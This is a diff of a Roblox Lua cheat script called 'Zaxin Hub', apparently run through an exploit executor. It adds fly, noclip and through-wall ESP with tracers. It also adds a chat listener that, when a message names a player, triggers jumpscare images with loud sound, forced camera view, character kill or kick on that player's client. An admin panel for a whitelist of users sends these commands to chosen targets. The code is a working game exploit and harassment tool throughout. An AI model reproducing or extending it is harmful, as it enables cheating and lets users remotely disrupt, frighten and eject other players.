@@ -3,7 +3,6 @@ local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local TeleportService = game:GetService("TeleportService")
 local LocalPlayer = Players.LocalPlayer
 local Camera = workspace.CurrentCamera
@@ -19,10 +18,10 @@ local Autorizados = {
 }
 
 local JUMPSCARES = {
-    { Name = ";jumps1", ImageId = "rbxassetid://126754882337711", AudioId = "rbxassetid://138873214826309" },
-    { Name = ";jumps2", ImageId = "rbxassetid://86379969987314", AudioId = "rbxassetid://143942090" },
-    { Name = ";jumps3", ImageId = "rbxassetid://127382022168206", AudioId = "rbxassetid://143942090" },
-    { Name = ";jumps4", ImageId = "rbxassetid://95973611964555", AudioId = "rbxassetid://138873214826309" },
+    [";jumps1"] = {img = "rbxassetid://126754882337711", snd = "rbxassetid://138873214826309"},
+    [";jumps2"] = {img = "rbxassetid://86379969987314", snd = "rbxassetid://143942090"},
+    [";jumps3"] = {img = "rbxassetid://127382022168206", snd = "rbxassetid://143942090"},
+    [";jumps4"] = {img = "rbxassetid://95973611964555", snd = "rbxassetid://138873214826309"},
 }
 
 --// Variáveis de Controle
@@ -31,46 +30,52 @@ local flySpeed = 50
 local noclip = false
 local espEnabled = false
 local espSettings = { boxes = false, names = false, tracers = false }
-local jaulas = {}
-local jailConnections = {}
 local currentAudio = nil
 local noclipConnection
 
---// --- FUNÇÕES DE MOVIMENTAÇÃO (FLY / NOCLIP) ---
+--// --- FUNÇÃO JUMPSCARE ---
+local function AtivarJumpscare(data)
+    local gui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
+    gui.IgnoreGuiInset = true
+    local img = Instance.new("ImageLabel", gui)
+    img.Size = UDim2.new(1,0,1,0)
+    img.Image = data.img
+    img.BackgroundTransparency = 1
+    
+    local s = Instance.new("Sound", workspace)
+    s.SoundId = data.snd
+    s.Volume = 10
+    s:Play()
+    
+    task.wait(2.5)
+    gui:Destroy()
+    s:Destroy()
+end
+
+--// --- FUNÇÃO FLY ---
 local function toggleFly()
     flying = not flying
     local char = LocalPlayer.Character
     local root = char and char:FindFirstChild("HumanoidRootPart")
     local hum = char and char:FindFirstChildOfClass("Humanoid")
     if not root or not hum then return end
+
     if flying then
         hum.PlatformStand = true
         local bg = Instance.new("BodyGyro", root)
-        bg.P = 9e4; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9); bg.Name = "ZaxinFly"
+        bg.Name = "ZaxinFlyBG"; bg.P = 9e4; bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
         local bv = Instance.new("BodyVelocity", root)
-        bv.maxForce = Vector3.new(9e9, 9e9, 9e9); bv.Name = "ZaxinVel"
+        bv.Name = "ZaxinFlyBV"; bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
+
         task.spawn(function()
             while flying do
                 bg.cframe = Camera.CFrame
                 bv.velocity = (hum.MoveDirection.Magnitude > 0) and (Camera.CFrame.LookVector * flySpeed) or Vector3.new(0,0,0)
-                task.wait()
+                RunService.RenderStepped:Wait()
             end
             bg:Destroy(); bv:Destroy(); hum.PlatformStand = false
         end)
     end
-end
-
-local function toggleNoclip(state)
-    noclip = state
-    if noclip then
-        noclipConnection = RunService.Stepped:Connect(function()
-            if noclip and LocalPlayer.Character then
-                for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                    if part:IsA("BasePart") then part.CanCollide = false end
-                end
-            end
-        end)
-    else if noclipConnection then noclipConnection:Disconnect() end end
 end
 
 --// --- SISTEMA DE VISUAL (ESP) ---
@@ -86,13 +91,11 @@ local function createESP(player)
             if onScreen then
                 if espSettings.boxes then
                     box.Size = Vector2.new(2000/pos.Z, 3000/pos.Z)
-                    box.Position = Vector2.new(pos.X - box.Size.X/2, pos.Y - box.Size.Y/2)
-                    box.Visible = true
+                    box.Position = Vector2.new(pos.X - box.Size.X/2, pos.Y - box.Size.Y/2); box.Visible = true
                 else box.Visible = false end
                 if espSettings.names then
                     name.Position = Vector2.new(pos.X, pos.Y - 20)
-                    name.Text = player.Name .. " [" .. math.floor((root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude) .. "m]"
-                    name.Visible = true
+                    name.Text = player.Name .. " [" .. math.floor((root.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude) .. "m]"; name.Visible = true
                 else name.Visible = false end
                 if espSettings.tracers then
                     tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y); tracer.To = Vector2.new(pos.X, pos.Y); tracer.Visible = true
@@ -104,16 +107,29 @@ end
 for _,p in pairs(Players:GetPlayers()) do createESP(p) end
 Players.PlayerAdded:Connect(createESP)
 
---// --- COMANDOS ADMIN ---
-local function ExecutarComando(cmd, autor)
-    local texto = cmd:lower()
-    local meuNome = LocalPlayer.Name:lower()
+--// --- COMANDOS DE CHAT (RECEPÇÃO) ---
+local function ExecutarComando(msg, autor)
+    local texto = msg:lower()
+    local alvo = LocalPlayer.Name:lower()
 
-    if texto:match(";view%s+"..meuNome) then Camera.CameraSubject = Players:FindFirstChild(autor).Character.Humanoid end
-    if texto:match(";unview") then Camera.CameraSubject = LocalPlayer.Character.Humanoid end
-    if texto:match(";hop") then TeleportService:Teleport(game.PlaceId, LocalPlayer) end
-    if texto:match(";kill%s+"..meuNome) then LocalPlayer.Character:BreakJoints() end
-    if texto:match(";kick%s+"..meuNome) then LocalPlayer:Kick("Zaxin Hub") end
+    for cmd, data in pairs(JUMPSCARES) do
+        if texto:find(cmd) and texto:find(alvo) then AtivarJumpscare(data) end
+    end
+
+    if texto:find(";audioall") then
+        local id = texto:match("%d+")
+        if id then
+            if currentAudio then currentAudio:Destroy() end
+            currentAudio = Instance.new("Sound", workspace)
+            currentAudio.SoundId = "rbxassetid://"..id
+            currentAudio.Volume = 5; currentAudio:Play()
+        end
+    end
+
+    if texto:find(";view") and texto:find(alvo) then Camera.CameraSubject = Players:FindFirstChild(autor).Character.Humanoid end
+    if texto:find(";unview") and texto:find(alvo) then Camera.CameraSubject = LocalPlayer.Character.Humanoid end
+    if texto:find(";kill") and texto:find(alvo) then LocalPlayer.Character:BreakJoints() end
+    if texto:find(";kick") and texto:find(alvo) then LocalPlayer:Kick("Zaxin Hub Admin") end
 end
 
 TextChatService.MessageReceived:Connect(function(msg) if msg.TextSource then ExecutarComando(msg.Text, msg.TextSource.Name) end end)
@@ -127,10 +143,10 @@ if Autorizados[LocalPlayer.Name] then
     local TabSelf = Window:Tab({ Title = "Self", Icon = "user" })
     local SecMov = TabSelf:Section({ Title = "Movimentação", Opened = true })
     SecMov:Toggle({ Title = "Fly", Callback = toggleFly })
-    SecMov:Toggle({ Title = "Noclip", Callback = toggleNoclip })
-    local fSlider = SecMov:Slider({ Title = "Fly Speed", Min = 10, Max = 500, Default = 50, Callback = function(v) flySpeed = v end })
-    SecMov:Input({ Title = "Input Fly Speed", Placeholder = "Velocidade...", Callback = function(v) flySpeed = tonumber(v) or 50 fSlider:SetValue(flySpeed) end })
-    SecMov:Button({ Title = "Server Hop", Callback = function() TeleportService:Teleport(game.PlaceId, LocalPlayer) end })
+    SecMov:Toggle({ Title = "Noclip", Callback = function(s) noclip = s end })
+    
+    -- MANTIDO APENAS O INPUT FLY SPEED
+    SecMov:Input({ Title = "Input Fly Speed", Placeholder = "Digite a velocidade (Ex: 100)", Callback = function(v) flySpeed = tonumber(v) or 50 end })
 
     -- ABA VISUAL
     local TabVis = Window:Tab({ Title = "Visual", Icon = "eye" })
@@ -140,29 +156,36 @@ if Autorizados[LocalPlayer.Name] then
     SecESP:Toggle({ Title = "Names", Callback = function(s) espSettings.names = s end })
     SecESP:Toggle({ Title = "Tracers", Callback = function(s) espSettings.tracers = s end })
 
-    -- ABA MÚSICAS
+    -- ABA ÁUDIO
     local TabMus = Window:Tab({ Title = "Áudio", Icon = "music" })
-    local function play(id) if currentAudio then currentAudio:Destroy() end currentAudio = Instance.new("Sound", workspace); currentAudio.SoundId = "rbxassetid://"..id; currentAudio.Volume = 2; currentAudio:Play() end
-    TabMus:Section({ Title = "Funk" }):Button({ Title = "Funk MTG", Callback = function() play(17341315082) end })
-    TabMus:Section({ Title = "Sertanejo" }):Button({ Title = "Sertanejo Mix", Callback = function() play(13360351322) end })
-    TabMus:Section({ Title = "Rap" }):Button({ Title = "Rap Matuê", Callback = function() play(6441313543) end })
-    local aSec = TabMus:Section({ Title = "Custom" })
     local cID = ""
-    aSec:Input({ Title = "ID do Áudio", Callback = function(v) cID = v end })
-    aSec:Button({ Title = "Play", Callback = function() play(cID) end })
-    aSec:Button({ Title = "Audio All", Callback = function() TextChatService.TextChannels.RBXGeneral:SendAsync(";audioall "..cID) end })
+    local SecAud = TabMus:Section({ Title = "Global Audio", Opened = true })
+    SecAud:Input({ Title = "Colocar ID aqui", Placeholder = "Digite o ID...", Callback = function(v) cID = v end })
+    SecAud:Button({ Title = "AUDIO ALL (Todos ouvem)", Callback = function() 
+        if cID ~= "" then 
+            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if canal then canal:SendAsync(";audioall "..cID) end
+        end
+    end })
+    SecAud:Button({ Title = "Parar Tudo", Callback = function() if currentAudio then currentAudio:Stop() end end })
 
     -- ABA ADMIN
     local TabAdm = Window:Tab({ Title = "Admin", Icon = "shield" })
     local Target = ""
     TabAdm:Dropdown({ Title = "Alvo", Values = (function() local t={}; for _,p in pairs(Players:GetPlayers()) do table.insert(t,p.Name) end; return t end)(), Callback = function(v) Target = v end })
-    TabAdm:Button({ Title = "VIEW", Callback = function() Camera.CameraSubject = Players[Target].Character.Humanoid end })
-    TabAdm:Button({ Title = "UNVIEW", Callback = function() Camera.CameraSubject = LocalPlayer.Character.Humanoid end })
-    for _,c in pairs({"kill", "kick", "fling", "jail", "unjail"}) do
-        TabAdm:Button({ Title = c:upper(), Callback = function() TextChatService.TextChannels.RBXGeneral:SendAsync(";"..c.." "..Target) end })
+    for _,c in pairs({"view", "unview", "kill", "kick", "fling", "jail", "unjail"}) do
+        TabAdm:Button({ Title = c:upper(), Callback = function() 
+            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if canal then canal:SendAsync(";"..c.." "..Target) end
+        end })
     end
     
     -- ABA JUMPSCARES
     local TabJump = Window:Tab({ Title = "Jumpscares", Icon = "zap" })
-    for i=1,4 do TabJump:Button({ Title = "Jumpscare "..i, Callback = function() TextChatService.TextChannels.RBXGeneral:SendAsync(";jumps"..i.." "..Target) end }) end
+    for i=1,4 do 
+        TabJump:Button({ Title = "Jumpscare "..i, Callback = function() 
+            local canal = TextChatService.TextChannels:FindFirstChild("RBXGeneral")
+            if canal then canal:SendAsync(";jumps"..i.." "..Target) end
+        end }) 
+    end
 end
